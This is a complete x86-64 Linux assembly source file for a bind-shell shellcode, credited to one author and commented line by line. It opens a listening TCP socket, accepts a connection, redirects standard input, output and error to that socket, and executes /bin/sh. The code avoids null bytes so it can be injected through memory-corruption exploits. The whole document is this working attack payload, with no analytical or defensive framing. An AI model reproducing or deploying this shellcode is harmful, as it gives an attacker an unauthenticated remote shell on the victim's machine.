;;
;; bindshell.S for shellcodes
;; by lenormf
;;

bits 64

global _start

section .text

_start:
	;; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
	xor rsi, rsi
	inc rsi				;; rsi = 1 (SOCK_STREAM)
	mov rdi, rsi
	inc rdi				;; rdi = 2 (AF_INET)
	xor rdx, rdx
	xor rax, rax			;; rax = 0 (IPPROTO_IP)
	mov al, 41			;; rax = 41 (socket)
	syscall

	;; bind(sock, {AF_INET, htons(4242), 0, 0}, 16)
	mov rdi, rax			;; rdi = sock
	push QWORD rdx			;; rdx == 0 (sin_zero)
	push 0x4008ff02
	mov [rsp + 1], dl
	mov rsi, rsp
	mov dl, 16			;; rdx = 16 (sizeof(struct sockaddr_in))
	xor rax, rax
	mov al, 49			;; rax = 49 (bind)
	syscall

	;; listen(sock, 5)
	xor dl, 21			;; rdx = 5
	mov rsi, rdx
	mov al, 50			;; rax = 50 (listen)
	syscall

	;; accept(sock, 0, 0)
	xor rsi, rsi
	xor rdx, rdx
	mov al, 43			;; rax = 43 (accept)
	syscall

	mov rdi, rax			;; save sock

	;; dup2(sock, 0)
	xor rsi, rsi
	xor rax, rax
	mov al, 33			;; rax = 33 (dup2)
	syscall

	;; dup2(sock, 1)
	inc rax
	mov rsi, rax
	xor rax, rax
	mov al, 33			;; rax = 33 (dup2)
	syscall

	;; dup2(sock, 2)
	inc rax
	mov rsi, rax
	xor rax, rax
	mov al, 33			;; rax = 33 (dup2)
	syscall

	;; execve("/bin/sh", 0, 0)
	mov rax, 0x68732f6e69622fff	;; rax = "\xFF/bin/sh"
	shr rax, 8			;; rax = "/bin/sh"
	push rax
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	xor rax, rax
	mov al, 59			;; rax = 59 (execve)
	syscall
